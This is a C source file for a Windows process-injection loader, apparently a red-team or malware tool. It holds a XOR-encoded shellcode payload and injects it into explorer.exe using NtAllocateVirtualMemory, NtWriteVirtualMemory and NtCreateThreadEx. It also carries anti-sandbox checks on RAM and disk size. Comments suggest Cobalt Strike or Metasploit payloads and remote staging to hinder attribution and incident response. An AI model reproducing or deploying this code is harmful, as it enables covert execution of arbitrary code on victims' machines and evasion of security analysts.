#include <Windows.h>
#include <stdio.h>
#include "connector.h"
#include "sysopen.h"
//#include <wininet.h>
/*  ^ keeping this cuz if i include getting shellcode via http on specified web server(acts as a stager) so that if
payload gets caught you can disable whereever you saved the shellcode remotely to limit attribution and make IR a little harder
*/


// shellcode is from sektor7 rto course, but you can use cobalt strike / metasploit / whatever c2 else
char payload[] = "\x38\x8c\x45\x20\x34\x3b\x3b\x3b\x2c\x14\xc4\xc4\xc4\x85\x95\x85\x94\x96\x95\x92\x8c\xf5\x16\xa1\x8c\x4f\x96\xa4\xfa\x8c\x4f\x96\xdc\xfa\x8c\x4f\x96\xe4\xfa\x8c\x4f\xb6\x94\xfa\x8c\xcb\x73\x8e\x8e\x89\xf5\xd\x8c\xf5\x4\x68\xf8\xa5\xb8\xc6\xe8\xe4\x85\x5\xd\xc9\x85\xc5\x5\x26\x29\x96\x85\x95\xfa\x8c\x4f\x96\xe4\xfa\x4f\x86\xf8\x8c\xc5\x14\xfa\x4f\x44\x4c\xc4\xc4\xc4\x8c\x41\x4\xb0\xab\x8c\xc5\x14\x94\xfa\x4f\x8c\xdc\xfa\x80\x4f\x84\xe4\x8d\xc5\x14\x27\x98\x8c\x3b\xd\xfa\x85\x4f\xf0\x4c\x8c\xc5\x12\x89\xf5\xd\x8c\xf5\x4\x68\x85\x5\xd\xc9\x85\xc5\x5\xfc\x24\xb1\x35\xfa\x88\xc7\x88\xe0\xcc\x81\xfd\x15\xb1\x12\x9c\xfa\x80\x4f\x84\xe0\x8d\xc5\x14\xa2\xfa\x85\x4f\xc8\x8c\xfa\x80\x4f\x84\xd8\x8d\xc5\x14\xfa\x85\x4f\xc0\x4c\x8c\xc5\x14\x85\x9c\x85\x9c\x9a\x9d\x9e\x85\x9c\x85\x9d\x85\x9e\x8c\x47\x28\xe4\x85\x96\x3b\x24\x9c\x85\x9d\x9e\xfa\x8c\x4f\xd6\x2d\x8d\x3b\x3b\x3b\x99\x8d\x3\x5\xc4\xc4\xc4\xc4\xfa\x8c\x49\x51\xde\xc5\xc4\xc4\xfa\x88\x49\x41\xf1\xc5\xc4\xc4\x8c\xf5\xd\x85\x7e\x81\x47\x92\xc3\x3b\x11\x7f\x24\xd9\xee\xce\x85\x7e\x62\x51\x79\x59\x3b\x11\x8c\x47\x0\xec\xf8\xc2\xb8\xce\x44\x3f\x24\xb1\xc1\x7f\x83\xd7\xb6\xab\xae\xc4\x9d\x85\x4d\x1e\x3b\x11\x8c\xad\xe4\xa2\xb6\xab\xa9\xe4\x96\xa1\xa0\xe4\x90\xa1\xa5\xa9\xe4\x8b\xb4\xa1\xb6\xa5\xb0\xab\xb6\xe5\xc4\x96\x90\x8b\xfe\xe4\x89\xa5\xa8\x80\xa1\xb2\xc4";
PVOID remoteBuf;
HANDLE processHandle;
STARTUPINFO info = { 0 };
PROCESS_INFORMATION processInfo = { 0 };


int remInj() {

	if (find() != 0) {
		//printf("[+] Process ID for explorer.exe: %d\n", find());
		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(find()));
	}
	else if (CreateProcess(L"C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &info, &processInfo) != 0) {
				//printf("[+] %s created succesfully with pid %d.\n", "notepad.exe", find());
				processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(find()));
	}
	else {
		return 0;
	}

	NTSTATUS status;
	SIZE_T allocSize = sizeof(payload);
	//printf("[+] Allocating Virtual Memory!\n");

	status = NtAllocateVirtualMemory(processHandle, &remoteBuf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!status) {
		//printf("[+] Virtual Memory Allocated!\n");
	}

	int n = 0;
	int checkWrite = 0;
	//printf("[+] Attempting to write some bytes....\n");

	for (int i = 0; i < sizeof(payload); i++) {

		char singByte = payload[i] ^ 0xC4;
		status = NtWriteVirtualMemory(processHandle, LPVOID((ULONG_PTR)remoteBuf + n), &singByte, 0x1, NULL);
		if (!status) {
			//printf("\n[+] Byte 0x%X WROTE to 0x%X", singByte, LPVOID((ULONG_PTR)remoteBuf + n));
			n++;
			if (checkWrite == 0) {
				//printf("[+] Some bytes wrote!\n");
				checkWrite = 1;
			}
		}
	}
	//printf("[+] Memory allocated, ready to run. Press any key to run\n");
	//getchar();

	HANDLE hThread;
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, 0, NULL, NULL, NULL, NULL, NULL);
	WaitForSingleObject(HANDLE(hThread), 1000); // wait 2.5 seconds before invoking NtClose


	NtClose(processHandle);

}


int antidbg() {
	/* I forgot where I found the ram checkand storage space check functions.You can also use techniques from
	vx-underground's anti debug trick library*/
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAM = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAM < 4096) {
		//printf("RAM lessthan 4096 MB, Possibly a Sandbox / VM \n");
		return -1;
	}
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD disk = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (disk < 100){
		//printf("disk storage less than 100 GB, Possibly a Sandbox / VM \n");
		return -1;
	}

	remInj();
	return 44;
}

int main(int argc, char* argv[]) {
if (antidbg() == 44) {
	printf("Running xD\n");
	return 0;
}
else if (antidbg() == -1) {
	printf("in a sandbox xD\n");
	return 0;
 }
}